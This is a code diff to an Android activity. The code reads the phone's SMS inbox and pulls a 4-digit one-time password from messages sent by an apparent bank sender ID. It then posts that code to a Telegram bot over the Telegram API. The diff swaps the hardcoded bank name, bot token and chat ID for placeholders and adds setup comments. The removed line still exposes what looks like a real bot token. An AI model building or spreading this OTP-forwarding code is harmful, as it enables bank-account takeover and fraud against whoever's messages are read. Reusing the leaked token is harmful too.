@@ -20,8 +20,8 @@ public class MainActivity2 extends AppCompatActivity  {
     String msgName = "";
     String smsmessage="";
     String date="";
-    String Name="AX-KOTAK";
-    Pattern pattern = Pattern.compile("(\\d{4})");
+    String Name="xyz";                                                   // Type any text which you want to search for in SMS(Messages) app..
+    Pattern pattern = Pattern.compile("(\\d{4})");                       // will show if NAME string couldn't be found..
     String val = "No "+Name+" found ";
     String t;
     String username2="";
@@ -42,12 +42,12 @@ public class MainActivity2 extends AppCompatActivity  {
         Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
         int x = cursor.getCount();
         cursor.moveToFirst();
-        for (int i = 1; i <= x; i++) {
+        for (int i = 1; i <= x; i++) {                                    //Reading Sms from Our phone...
             msgName = cursor.getString(2);
             smsmessage = cursor.getString(12);
 
             if (msgName.equals(Name)) {
-                Matcher matcher = pattern.matcher(smsmessage);
+                Matcher matcher = pattern.matcher(smsmessage);               //This line will seacrh for 4 digit number in the whole message which you have typed NAME(String) above ..
 
                 if (matcher.find()) {
                     val = matcher.group(0);
@@ -67,9 +67,13 @@ public class MainActivity2 extends AppCompatActivity  {
         }
 
         if (!val.equals("Not Found !") && !val.equals("No "+Name+" found ")){
-            gotoUrl("https://api.telegram.org/bot1799178653:AAH00J2q7asxuO9omvJwDroduc8HOCvcjXU/sendMessage?chat_id=-505163273?????&text=Todays OTP of "+username+" "+ val);
+            gotoUrl("https://api.telegram.org/bot[ Type bot id ]/sendMessage?chat_id=[ Type chat id ]?????&text=Todays OTP of "+" "+ val);
 
-        }
+        }         /*
+                    Above if condition is for Telegram API entre your bot id and chat id of your choice...
+                    above condition will only work if message will be founded in your phone ..
+                    
+                  */
 
 
 
